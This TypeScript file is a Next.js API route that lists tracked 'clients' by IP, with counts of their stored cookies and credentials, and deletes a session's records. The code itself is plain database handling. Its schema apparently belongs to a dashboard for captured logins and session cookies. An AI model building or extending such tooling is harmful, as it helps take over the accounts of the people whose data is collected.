// app/api/clients/route.ts
import { NextResponse } from "next/server";
import { mainDb } from "@/lib/db";
import { clients, clientCookies, credentials } from "@/lib/schema/main.schema";
import { eq, sql, desc } from "drizzle-orm";
import { requireRouteSession } from "@/lib/auth";

export async function GET() {
  try {
    if (!(await requireRouteSession())) return NextResponse.json({ success: false, error: "Unauthorized" }, { status: 401 });
    // Get all clients with cookie and credential counts via subqueries
    const rows = mainDb
      .select({
        sessionId: clients.sessionId,
        client_ip: clients.client_ip,
        first_seen: clients.first_seen,
        last_seen: clients.last_seen,
        cookie_count: sql<number>`(SELECT COUNT(*) FROM client_cookies WHERE client_cookies.sessionId = ${clients.sessionId})`,
        credential_count: sql<number>`(SELECT COUNT(*) FROM credentials WHERE credentials.sessionId = ${clients.sessionId})`,
      })
      .from(clients)
      .orderBy(desc(clients.last_seen))
      .all();

    return NextResponse.json({ success: true, clients: rows });
  } catch (error: any) {
    console.error("Clients GET Error:", error);
    return NextResponse.json(
      { success: false, error: error.message },
      { status: 500 }
    );
  }
}

export async function DELETE(request: Request) {
  try {
    if (!(await requireRouteSession())) return NextResponse.json({ success: false, error: "Unauthorized" }, { status: 401 });
    const { searchParams } = new URL(request.url);
    const sessionId = searchParams.get("sessionId");

    if (!sessionId) {
      return NextResponse.json(
        { success: false, error: "Missing sessionId parameter" },
        { status: 400 }
      );
    }

    // Cascade delete in a transaction
    mainDb.transaction((tx) => {
      tx.delete(credentials).where(eq(credentials.sessionId, sessionId)).run();
      tx.delete(clientCookies).where(eq(clientCookies.sessionId, sessionId)).run();
      tx.delete(clients).where(eq(clients.sessionId, sessionId)).run();
    });

    return NextResponse.json({
      success: true,
      message: `Session ${sessionId} deleted successfully`,
    });
  } catch (error: any) {
    console.error("Clients DELETE Error:", error);
    return NextResponse.json(
      { success: false, error: error.message },
      { status: 500 }
    );
  }
}
